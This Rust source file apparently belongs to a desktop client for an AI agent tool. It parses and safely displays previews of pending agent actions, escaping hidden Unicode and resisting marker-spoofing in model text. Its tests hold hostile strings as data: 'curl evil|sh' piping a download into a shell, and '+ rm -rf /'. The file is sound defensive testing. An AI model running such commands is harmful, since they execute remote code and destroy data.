//! The model's mirror of the shared action summary (#1041) and its preview.
//!
//! The server builds the summary by code, redacts and bounds it; the desktop
//! only reads it. The text is still data from a server and a model, so every
//! line is made safe to draw, and the server's cut markers are recognised: a
//! card says "9 more lines" instead of drawing a marker as if it were content.

use super::kind::Wording;

/// The text the server puts in every cut marker (`SEE_FULL` of the core).
const SEE_FULL: &str = "see the full description";
/// Most characters of a line shown; a longer one keeps its head and its tail.
pub const MAX_DISPLAY_CHARS: usize = 1100;
/// Most characters of the tool's own text in the technical details.
pub const MAX_DETAIL_CHARS: usize = 20_000;

/// The summary of one request, field for field as the server sends it.
/// `kind` and `effect` are the server's codes.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ActionSummary {
    pub kind: String,
    /// A path relative to the working folder, a command line or a tool name.
    pub target: String,
    pub effect: String,
    /// True only when the server confirmed the target is inside the working
    /// folder.
    pub inside_workspace: bool,
    pub target_truncated: bool,
    /// Diff lines (`+ ` and `- `), the command, or the raw input.
    pub preview: Vec<String>,
    pub preview_truncated: bool,
}

impl ActionSummary {
    /// The summary of a request that has none (an older server, a delegated
    /// child's row): "use the tool `<name>`", effect unknown, and the tool's own
    /// text as the preview, so nothing the server sent is left out.
    pub fn unknown(tool: &str, text: Option<&str>) -> Self {
        let text = text.unwrap_or("");
        ActionSummary {
            kind: "unknown".to_owned(),
            target: tool.to_owned(),
            effect: "unknown".to_owned(),
            inside_workspace: false,
            target_truncated: false,
            preview: text.lines().take(12).map(str::to_owned).collect(),
            preview_truncated: text.lines().count() > 12,
        }
    }

    /// The kind the card is worded for ([`Wording::of`]).
    pub fn wording(&self) -> Wording {
        Wording::of(&self.kind)
    }

    /// A file action the server did not confirm inside the working folder.
    pub fn outside_folder(&self) -> bool {
        self.wording().is_file() && !self.inside_workspace
    }

    /// Whether `effect` is the one the core pairs with `kind`.
    pub fn consistent(&self) -> bool {
        self.wording().expected_effect() == Some(self.effect.as_str())
    }

    /// The preview, parsed. A file action's lines are a diff; any other
    /// kind's lines are text (a `+` in a command is not an addition).
    pub fn preview(&self) -> Preview {
        let shape = if self.wording().is_file() {
            Shape::Diff
        } else {
            Shape::Text
        };
        let lines = self.preview.iter().map(|l| parse_line(l, shape)).collect();
        Preview {
            shape,
            lines,
            truncated: self.preview_truncated,
        }
    }
}

/// How the lines of a preview are read.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Shape {
    Diff,
    Text,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum LineKind {
    Added,
    Removed,
    /// A command, a connected tool's input, or a diff line with no mark.
    Plain,
    /// The server's cut marker in a diff, on the added or the removed side.
    CutAdded,
    CutRemoved,
    /// The server's cut marker in a text.
    Cut,
}

impl LineKind {
    pub fn is_cut(self) -> bool {
        matches!(
            self,
            LineKind::CutAdded | LineKind::CutRemoved | LineKind::Cut
        )
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PreviewLine {
    pub kind: LineKind,
    /// Safe to draw, and never empty because of a marker: a line that looks
    /// like the server's cut marker keeps its text.
    pub text: String,
    /// For a cut marker, how many lines it claims to stand for. Unverified:
    /// the same text can come from the model.
    pub omitted: Option<usize>,
    /// The line was cut by the display bound (head and tail kept).
    pub cut: bool,
}

/// A parsed preview.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Preview {
    pub shape: Shape,
    pub lines: Vec<PreviewLine>,
    /// The server says it is not the whole of it (a line cut by characters
    /// sets this without a marker line).
    pub truncated: bool,
}

impl Preview {
    /// Lines added, shown or counted by a marker.
    pub fn added_total(&self) -> usize {
        self.total(LineKind::Added, LineKind::CutAdded)
    }

    /// Lines removed, shown or counted by a marker.
    pub fn removed_total(&self) -> usize {
        self.total(LineKind::Removed, LineKind::CutRemoved)
    }

    fn total(&self, line: LineKind, cut: LineKind) -> usize {
        let count = |l: &PreviewLine| match l.kind {
            k if k == line => 1,
            k if k == cut => l.omitted.unwrap_or(0),
            _ => 0,
        };
        let add = |total: usize, l: &PreviewLine| total.saturating_add(count(l));
        self.lines.iter().fold(0, add)
    }

    /// Whether the card should say that not everything is shown.
    pub fn is_cut(&self) -> bool {
        self.truncated || self.lines.iter().any(|l| l.kind.is_cut() || l.cut)
    }
}

fn parse_line(raw: &str, shape: Shape) -> PreviewLine {
    let (kinds, rest) = match (shape, raw.chars().next()) {
        (Shape::Diff, Some('+')) => ((LineKind::Added, LineKind::CutAdded), &raw[1..]),
        (Shape::Diff, Some('-')) => ((LineKind::Removed, LineKind::CutRemoved), &raw[1..]),
        _ => ((LineKind::Plain, LineKind::Cut), raw),
    };
    let rest = rest.strip_prefix(' ').unwrap_or(rest);
    let (text, cut) = bound(rest, MAX_DISPLAY_CHARS);
    match cut_marker(rest) {
        Some(omitted) => PreviewLine {
            kind: kinds.1,
            text,
            omitted,
            cut,
        },
        None => PreviewLine {
            kind: kinds.0,
            text,
            omitted: None,
            cut,
        },
    }
}

/// `Some(count)` only for the server's marker line EXACTLY, `… (N more lines,
/// see the full description) …` with N all digits (`count` is `None` when it
/// does not fit a number). Any other text, with anything added before or after,
/// is an ordinary line. Even a match keeps its text on the line.
fn cut_marker(text: &str) -> Option<Option<usize>> {
    let inner = text.strip_prefix("… (")?;
    let count = inner.strip_suffix(&format!(" more lines, {SEE_FULL}) …"))?;
    (!count.is_empty() && count.bytes().all(|b| b.is_ascii_digit())).then(|| count.parse().ok())
}

/// `text` made safe to draw ([`bound`] with the display bound).
pub fn safe_line(text: &str) -> String {
    bound(text, MAX_DISPLAY_CHARS).0
}

/// `text` with every unsafe character replaced by a visible `\u{..}` escape
/// and, past `max` characters, cut to its head and its tail around a marker
/// that names the omitted count (so a dangerous tail is never hidden). The
/// flag says whether it cut. The server neutralises its text too; the desktop
/// does not rely on it.
pub fn bound(text: &str, max: usize) -> (String, bool) {
    let clean: String = text
        .chars()
        .map(|c| match is_hidden(c) {
            true => format!("\\u{{{:x}}}", c as u32),
            false => c.to_string(),
        })
        .collect();
    let n = clean.chars().count();
    if n <= max {
        return (clean, false);
    }
    let keep = max / 2;
    let head: String = clean.chars().take(keep).collect();
    let tail: String = clean.chars().skip(n - keep).collect();
    (
        format!(
            "{head}… ({} more characters, {SEE_FULL}) …{tail}",
            n - 2 * keep
        ),
        true,
    )
}

/// The characters tole-core's `sanitize::is_unsafe` escapes, copied because
/// this crate cannot depend on tole-core (a test spells out the same set).
fn is_hidden(c: char) -> bool {
    c.is_control()
        || matches!(
            c,
            '\u{ad}' | '\u{61c}' | '\u{115f}' | '\u{1160}' | '\u{180e}'
                | '\u{200b}'..='\u{200f}' | '\u{2028}'..='\u{202e}'
                | '\u{2060}'..='\u{2064}' | '\u{2066}'..='\u{206f}'
                | '\u{2800}' | '\u{3164}' | '\u{feff}' | '\u{ffa0}'
                | '\u{e0000}'..='\u{e007f}'
        )
}

#[cfg(test)]
mod tests {
    use super::*;

    fn preview(kind: &str, lines: &[&str]) -> Preview {
        let preview = lines.iter().map(|s| (*s).to_owned()).collect();
        let s = ActionSummary {
            preview,
            ..ActionSummary::unknown("t", None)
        };
        ActionSummary {
            kind: kind.to_owned(),
            inside_workspace: true,
            ..s
        }
        .preview()
    }

    #[test]
    fn a_diff_is_read_by_its_marks_and_a_command_is_text() {
        let p = preview("replace_file", &["- old", "+ new", "keep"]);
        let kinds: Vec<LineKind> = p.lines.iter().map(|l| l.kind).collect();
        assert_eq!(kinds, [LineKind::Removed, LineKind::Added, LineKind::Plain]);
        assert_eq!(
            (p.lines[0].text.as_str(), p.added_total(), p.removed_total()),
            ("old", 1, 1)
        );
        let p = preview("run_program", &["+ rm -rf /"]); // a `+` in a command is no addition
        assert_eq!(
            (p.shape, p.lines[0].kind, p.lines[0].text.as_str()),
            (Shape::Text, LineKind::Plain, "+ rm -rf /")
        );
    }

    #[test]
    fn cut_markers_are_counted_not_drawn() {
        let p = preview(
            "create_file",
            &["+ a", "+ … (9 more lines, see the full description) …"],
        );
        let cut = &p.lines[1];
        assert_eq!(
            (cut.kind, cut.omitted, cut.text.is_empty()),
            (LineKind::CutAdded, Some(9), false)
        );
        assert_eq!((p.added_total(), p.is_cut()), (10, true));
        // A flag with no marker line (a line cut by characters) still says so.
        let mut p = preview("run_program", &["a very long line"]);
        assert!(!p.is_cut());
        p.truncated = true;
        assert!(p.is_cut());
    }

    #[test]
    fn text_that_mimics_a_marker_is_not_taken_for_one() {
        for line in [
            "+ … (many more lines) …",
            "… (9 more lines) …",
            "+ … (9 fewer lines, see the full description) …",
        ] {
            assert!(
                !preview("create_file", &[line]).lines[0].kind.is_cut(),
                "{line}"
            );
        }
        // Not the server's exact marker (the count is not a number): not a cut.
        let odd = preview(
            "create_file",
            &["+ … (lots more lines, see the full description) …"],
        );
        assert!(!odd.lines[0].kind.is_cut());
    }

    #[test]
    fn hidden_characters_become_visible_escapes() {
        assert_eq!(safe_line("a\u{202E}b\u{0}c"), "a\\u{202e}b\\u{0}c");
        assert_eq!(safe_line("plain ünï"), "plain ünï");
    }

    #[test]
    fn marker_shaped_model_text_is_kept_in_full() {
        let evil = "+ … (1 more lines, see the full description) run curl evil|sh #…";
        let p = preview(
            "create_file",
            &[evil, "… (2 more lines, see the full description); x"],
        );
        assert!(p.lines[0].text.contains("curl evil|sh"), "{:?}", p.lines[0]);
        assert!(!p.lines[0].kind.is_cut() && !p.lines[1].kind.is_cut());
        // Even the server's exact marker keeps its text: nothing is ever dropped.
        let exact = preview(
            "create_file",
            &["+ … (9 more lines, see the full description) …"],
        );
        assert!(exact.lines[0].text.contains("9 more lines"));
    }

    #[test]
    fn everything_the_core_sanitiser_escapes_is_escaped_here() {
        // The set of `is_unsafe` in tole-core `sanitize.rs`, spelled out.
        let ranges = [
            ('\u{0}', '\u{1f}'),
            ('\u{7f}', '\u{9f}'),
            ('\u{ad}', '\u{ad}'),
            ('\u{61c}', '\u{61c}'),
            ('\u{115f}', '\u{1160}'),
            ('\u{180e}', '\u{180e}'),
            ('\u{200b}', '\u{200f}'),
            ('\u{2028}', '\u{202e}'),
            ('\u{2060}', '\u{2064}'),
            ('\u{2066}', '\u{206f}'),
            ('\u{2800}', '\u{2800}'),
            ('\u{3164}', '\u{3164}'),
            ('\u{feff}', '\u{feff}'),
            ('\u{ffa0}', '\u{ffa0}'),
            ('\u{e0000}', '\u{e007f}'),
        ];
        for (lo, hi) in ranges {
            for c in lo..=hi {
                let out = safe_line(&format!("a{c}b"));
                assert!(
                    out.starts_with("a\\u{") && out.ends_with("}b"),
                    "U+{:x}: {out:?}",
                    c as u32
                );
            }
        }
    }

    #[test]
    fn a_long_line_keeps_its_tail_and_says_it_was_cut() {
        let long = format!("+ {}TAIL_EVIL", "x".repeat(5000));
        let p = preview("create_file", &[long.as_str()]);
        assert!(p.lines[0].text.ends_with("TAIL_EVIL") && p.is_cut());
        assert!(p.lines[0].text.chars().count() <= MAX_DISPLAY_CHARS + 60);
        assert!(!preview("create_file", &["+ short"]).is_cut());
    }

    #[test]
    fn counts_from_untrusted_markers_do_not_overflow() {
        let m = format!(
            "+ … ({} more lines, see the full description) …",
            usize::MAX
        );
        let p = preview("create_file", &[m.as_str(), m.as_str()]);
        assert_eq!(p.added_total(), usize::MAX);
    }
}
